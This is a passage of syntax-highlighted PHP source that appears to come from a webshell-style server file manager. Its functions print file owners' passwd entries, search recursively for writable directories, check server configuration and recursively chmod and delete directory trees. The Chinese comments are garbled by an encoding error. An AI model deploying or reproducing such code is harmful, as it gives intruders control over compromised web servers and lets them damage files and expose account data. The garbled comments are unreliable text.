        <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$dbname</span><span class="p">,</span> <span class="nv">$link</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h2&amp;gt;Database selected has error&amp;lt;/h2&amp;gt;&#39;</span><span class="p">);</span>
            <span class="k">exit</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$link</span> <span class="o">&amp;&amp;</span> <span class="nb">mysql_get_server_info</span><span class="p">()</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;4.1&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$charset</span> <span class="o">&amp;&amp;</span> <span class="nb">in_array</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$charset</span><span class="p">),</span> <span class="nv">$charsetdb</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">q</span><span class="p">(</span><span class="s2">&quot;SET character_set_connection=</span><span class="si">$charset</span><span class="s2">, character_set_results=</span><span class="si">$charset</span><span class="s2">, character_set_client=binary;&quot;</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$link</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// È¥µô×ªÒå×Ö·û</span>
<span class="k">function</span> <span class="nf">s_array</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$array</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$array</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$array</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nx">s_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$array</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$array</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$array</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$array</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Çå³ýHTML´úÂë</span>
<span class="k">function</span> <span class="nf">html_clean</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$content</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
    <span class="nv">$content</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;&amp;lt;br /&amp;gt;&quot;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
    <span class="nv">$content</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span> <span class="s2">&quot;&amp;nbsp;&amp;nbsp;&quot;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
    <span class="nv">$content</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// »ñÈ¡È¨ÏÞ</span>
<span class="k">function</span> <span class="nf">getChmod</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">){</span>
    <span class="k">return</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">base_convert</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">),</span><span class="mi">10</span><span class="p">,</span><span class="mi">8</span><span class="p">),</span><span class="o">-</span><span class="mi">4</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">getPerms</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$mode</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span><span class="p">;}</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s1">&#39;d&#39;</span><span class="p">;}</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s1">&#39;l&#39;</span><span class="p">;}</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="p">;}</span> 
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s1">&#39;b&#39;</span><span class="p">;}</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s1">&#39;c&#39;</span><span class="p">;}</span>
    <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s1">&#39;p&#39;</span><span class="p">;}</span>
    <span class="k">else</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s1">&#39;?&#39;</span><span class="p">;}</span>

    <span class="nv">$owner</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00400</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">;</span> 
    <span class="nv">$owner</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00200</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">;</span> 
    <span class="nv">$owner</span><span class="p">[</span><span class="s1">&#39;execute&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00100</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;x&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">;</span> 
    <span class="nv">$group</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00040</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">;</span> 
    <span class="nv">$group</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00020</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">;</span> 
    <span class="nv">$group</span><span class="p">[</span><span class="s1">&#39;execute&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00010</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;x&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">;</span> 
    <span class="nv">$world</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00004</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">;</span> 
    <span class="nv">$world</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00002</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">;</span> 
    <span class="nv">$world</span><span class="p">[</span><span class="s1">&#39;execute&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00001</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;x&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">;</span> 

    <span class="k">if</span><span class="p">(</span> <span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x800</span> <span class="p">)</span> <span class="p">{</span><span class="nv">$owner</span><span class="p">[</span><span class="s1">&#39;execute&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$owner</span><span class="p">[</span><span class="s1">&#39;execute&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;x&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;s&#39;</span> <span class="o">:</span> <span class="s1">&#39;S&#39;</span><span class="p">;}</span>
    <span class="k">if</span><span class="p">(</span> <span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x400</span> <span class="p">)</span> <span class="p">{</span><span class="nv">$group</span><span class="p">[</span><span class="s1">&#39;execute&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$group</span><span class="p">[</span><span class="s1">&#39;execute&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;x&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;s&#39;</span> <span class="o">:</span> <span class="s1">&#39;S&#39;</span><span class="p">;}</span>
    <span class="k">if</span><span class="p">(</span> <span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x200</span> <span class="p">)</span> <span class="p">{</span><span class="nv">$world</span><span class="p">[</span><span class="s1">&#39;execute&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$world</span><span class="p">[</span><span class="s1">&#39;execute&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;x&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;t&#39;</span> <span class="o">:</span> <span class="s1">&#39;T&#39;</span><span class="p">;}</span>
 
    <span class="k">return</span> <span class="nv">$type</span><span class="o">.</span><span class="nv">$owner</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$owner</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$owner</span><span class="p">[</span><span class="s1">&#39;execute&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$group</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$group</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$group</span><span class="p">[</span><span class="s1">&#39;execute&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$world</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$world</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$world</span><span class="p">[</span><span class="s1">&#39;execute&#39;</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">getUser</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">)</span>    <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;posix_getpwuid&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$array</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">));</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$array</span> <span class="o">&amp;&amp;</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="s1">&#39; / &amp;lt;a href=&quot;#&quot; title=&quot;User: &#39;</span><span class="o">.</span><span class="nv">$array</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;#13&amp;#10Passwd: &#39;</span><span class="o">.</span><span class="nv">$array</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;#13&amp;#10Uid: &#39;</span><span class="o">.</span><span class="nv">$array</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;#13&amp;#10gid: &#39;</span><span class="o">.</span><span class="nv">$array</span><span class="p">[</span><span class="s1">&#39;gid&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;#13&amp;#10Gecos: &#39;</span><span class="o">.</span><span class="nv">$array</span><span class="p">[</span><span class="s1">&#39;gecos&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;#13&amp;#10Dir: &#39;</span><span class="o">.</span><span class="nv">$array</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;#13&amp;#10Shell: &#39;</span><span class="o">.</span><span class="nv">$array</span><span class="p">[</span><span class="s1">&#39;shell&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$array</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt;&#39;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// É¾³ýÄ¿Â¼</span>
<span class="k">function</span> <span class="nf">deltree</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$mydir</span><span class="o">=@</span><span class="nb">dir</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">);</span>  
    <span class="k">while</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nv">$mydir</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">read</span><span class="p">())</span>    <span class="p">{</span>        
        <span class="k">if</span><span class="p">((</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$deldir</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;..&#39;</span><span class="p">))</span> <span class="p">{</span> 
            <span class="o">@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$deldir</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
            <span class="nx">deltree</span><span class="p">(</span><span class="nv">$deldir</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="p">);</span> 
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$deldir</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
            <span class="o">@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$deldir</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
            <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$deldir</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> 
    <span class="nv">$mydir</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">close</span><span class="p">();</span> 
    <span class="o">@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">@</span><span class="nb">rmdir</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">)</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// ±í¸ñÐÐ¼äµÄ±³¾°É«Ìæ»»</span>
<span class="k">function</span> <span class="nf">bg</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">global</span> <span class="nv">$bgc</span><span class="p">;</span>
    <span class="k">return</span> <span class="p">(</span><span class="nv">$bgc</span><span class="o">++%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;alt1&#39;</span> <span class="o">:</span> <span class="s1">&#39;alt2&#39;</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// »ñÈ¡µ±Ç°µÄÎÄ¼þÏµÍ³Â·¾¶</span>
<span class="k">function</span> <span class="nf">getPath</span><span class="p">(</span><span class="nv">$scriptpath</span><span class="p">,</span> <span class="nv">$nowpath</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$nowpath</span> <span class="o">==</span> <span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$nowpath</span> <span class="o">=</span> <span class="nv">$scriptpath</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$nowpath</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;\\&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$nowpath</span><span class="p">);</span>
    <span class="nv">$nowpath</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;//&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$nowpath</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$nowpath</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$nowpath</span> <span class="o">=</span> <span class="nv">$nowpath</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$nowpath</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// »ñÈ¡µ±Ç°Ä¿Â¼µÄÉÏ¼¶Ä¿Â¼</span>
<span class="k">function</span> <span class="nf">getUpPath</span><span class="p">(</span><span class="nv">$nowpath</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$pathdb</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$nowpath</span><span class="p">);</span>
    <span class="nv">$num</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$pathdb</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$num</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">unset</span><span class="p">(</span><span class="nv">$pathdb</span><span class="p">[</span><span class="nv">$num</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="nv">$pathdb</span><span class="p">[</span><span class="nv">$num</span><span class="o">-</span><span class="mi">2</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="nv">$uppath</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$pathdb</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
    <span class="nv">$uppath</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;//&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$uppath</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$uppath</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// ¼ì²éPHPÅäÖÃ²ÎÊý</span>
<span class="k">function</span> <span class="nf">getcfg</span><span class="p">(</span><span class="nv">$varname</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">get_cfg_var</span><span class="p">(</span><span class="nv">$varname</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s1">&#39;No&#39;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$result</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s1">&#39;Yes&#39;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// ¼ì²éº¯ÊýÇé¿ö</span>
<span class="k">function</span> <span class="nf">getfun</span><span class="p">(</span><span class="nv">$funName</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="nb">function_exists</span><span class="p">(</span><span class="nv">$funName</span><span class="p">))</span> <span class="o">?</span> <span class="s1">&#39;Yes&#39;</span> <span class="o">:</span> <span class="s1">&#39;No&#39;</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// »ñµÃÎÄ¼þÀ©Õ¹Ãû</span>
<span class="k">function</span> <span class="nf">getext</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$info</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$info</span><span class="p">[</span><span class="s1">&#39;extension&#39;</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">GetWDirList</span><span class="p">(</span><span class="nv">$dir</span><span class="p">){</span>
    <span class="k">global</span> <span class="nv">$dirdata</span><span class="p">,</span><span class="nv">$j</span><span class="p">,</span><span class="nv">$nowpath</span><span class="p">;</span>
    <span class="o">!</span><span class="nv">$j</span> <span class="o">&amp;&amp;</span> <span class="nv">$j</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$dh</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">while</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$f</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;//&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nv">$dir</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;.&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;..&#39;</span> <span class="o">&amp;&amp;</span> <span class="nb">is_dir</span><span class="p">(</span><span class="nv">$f</span><span class="p">)){</span>
                <span class="k">if</span> <span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span>
                    <span class="nv">$dirdata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="nv">$nowpath</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$f</span><span class="p">);</span>
                    <span class="nv">$dirdata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;mtime&#39;</span><span class="p">]</span><span class="o">=@</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$f</span><span class="p">));</span>
                    <span class="nv">$dirdata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;dirchmod&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">getChmod</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
                    <span class="nv">$dirdata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;dirperm&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">getPerms</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
                    <span class="nv">$dirdata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;dirlink&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$dir</span><span class="p">;</span>
                    <span class="nv">$dirdata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$f</span><span class="p">;</span>
                    <span class="nv">$j</span><span class="o">++</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="nx">GetWDirList</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nb">closedir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">);</span>
        <span class="nb">clearstatcache</span><span class="p">();</span>
        <span class="k">return</span> <span class="nv">$dirdata</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">array</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">GetWFileList</span><span class="p">(</span><span class="nv">$dir</span><span class="p">){</span>
    <span class="k">global</span> <span class="nv">$filedata</span><span class="p">,</span><span class="nv">$j</span><span class="p">,</span><span class="nv">$nowpath</span><span class="p">,</span> <span class="nv">$writabledb</span><span class="p">;</span>
    <span class="o">!</span><span class="nv">$j</span> <span class="o">&amp;&amp;</span> <span class="nv">$j</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$dh</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">while</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">getext</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
